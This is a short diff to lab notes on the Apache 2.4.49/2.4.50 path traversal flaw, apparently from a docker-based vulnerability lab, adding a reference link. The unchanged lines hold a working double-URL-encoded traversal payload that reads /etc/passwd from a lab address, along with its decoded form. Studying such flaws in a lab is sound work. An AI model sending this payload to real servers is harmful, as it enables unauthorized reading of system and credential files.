@@ -10,3 +10,4 @@
 - This issue affects Apache 2.4.49 and Apache 2.4.50 and not earlier versions.
 - Path Traversal payload - http://172.17.0.2:80/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/etc/passwd
 - Actual payload After double URL decode - http://172.17.0.2:80/cgi-bin/../../../../../../../etc/passwd
+- References: https://github.com/twseptian/cve-2021-42013-docker-lab
